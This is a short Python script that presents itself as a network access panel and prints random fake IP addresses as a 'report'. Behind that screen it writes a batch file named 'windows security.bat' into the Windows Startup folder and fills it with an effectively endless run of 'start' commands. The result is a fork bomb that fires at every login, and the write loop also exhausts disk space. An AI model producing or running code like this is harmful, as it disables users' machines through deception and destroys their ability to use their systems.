import os
import random

home_dir = os.path.expanduser("~")
startup_dir = home_dir+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
print("WELCOME TO THE ADVANCE NETWORK ACCESS PANEL")
dummy = input("PRESS ENTER")
print("\nGenerating Network report")
dummy = input("PRESS ENTER")
for i in range(0,8):
    load = random.randint(0,255)
    load=str(load)
    print("192"+"."+load+"."+str(random.randint(0,20))+"."+str((random.randint(0,255))))
    
print("Still working please wait...")
f = open(startup_dir+"\\windows security.bat","w")
f.write("@echo\n")
for i in range(10**100):
    f.write("start\n")

print("Restart your machine")


